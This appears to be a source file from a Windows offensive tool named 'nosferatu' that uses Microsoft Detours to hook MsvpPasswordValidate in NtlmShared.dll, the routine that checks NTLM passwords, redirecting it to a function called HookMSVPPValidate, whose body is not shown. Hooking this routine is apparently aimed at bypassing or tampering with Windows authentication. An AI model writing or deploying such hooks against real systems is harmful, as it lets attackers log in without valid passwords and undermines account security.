#include "pch.h"
#include "nosferatu.h"

bool InstallHook()
{
	RAII::Library ntlmShared(L"NtlmShared.dll");
	if (ntlmShared.GetHandle() == nullptr)
	{
		return false;
	}
	
	MsvpPasswordValidate = (pMsvpPasswordValidate)::GetProcAddress(ntlmShared.GetHandle(), "MsvpPasswordValidate");
	if (MsvpPasswordValidate == nullptr)
	{
		return false;
	}

	DetourTransactionBegin();
	DetourUpdateThread(::GetCurrentThread());
	DetourAttach(&(PVOID&)MsvpPasswordValidate, HookMSVPPValidate);
	LONG eCode = DetourTransactionCommit();
	if (eCode != NO_ERROR)
	{
		return false;
	}
	else
	{
		return true;
	}
}